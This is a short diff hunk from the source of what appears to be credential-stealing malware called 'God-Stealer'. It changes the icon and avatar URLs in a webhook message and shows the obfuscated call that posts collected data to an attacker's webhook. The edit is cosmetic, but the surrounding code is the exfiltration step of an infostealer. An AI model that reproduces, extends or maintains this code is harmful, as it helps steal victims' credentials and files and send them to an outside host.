@@ -709,12 +709,12 @@ def GatherZips(paths1, paths2, paths3):
             "color": 2895667,
             "footer": {
                 "text": "God-Stealer",
-                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                "icon_url": "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg"
             }
             }
         ],
         "username": "God-Stealer",
-        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
+        "avatar_url": "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
